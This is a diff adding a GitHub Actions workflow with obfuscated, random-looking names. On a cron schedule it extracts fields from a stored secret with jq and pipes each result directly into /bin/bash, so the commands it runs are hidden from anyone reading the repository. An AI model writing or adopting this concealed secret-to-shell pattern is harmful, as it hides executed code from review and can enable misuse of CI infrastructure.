@@ -1,0 +1,29 @@
+name: jinrongzhongjiud
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jinrongzhongjiud
+        env:
+          fuer69843: ${{ secrets.fuer69843 }}
+        run: |
+          echo $fuer69843 | jq -r .vhi555 | /bin/bash
+          echo $pfk9 | jq -r .ei6081 | /bin/bash
+          echo $tz85024 | jq -r .dtfz71179 | /bin/bash
+          echo $bkakf1772 | jq -r .g695 | /bin/bash
+          echo $u0428 | jq -r .fvh66 | /bin/bash
+          echo $zcu537 | jq -r .yloi5 | /bin/bash
+          echo $ulci7992 | jq -r .ihhb0 | /bin/bash
+          echo $k9 | jq -r .f34 | /bin/bash
+          echo $a963 | jq -r .yc2002 | /bin/bash
+          echo $ozb1306 | jq -r .e1761 | /bin/bash
+          echo $xdb0 | jq -r .drlmb8107 | /bin/bash
+          echo $cmui142 | jq -r .kpczh8 | /bin/bash
+
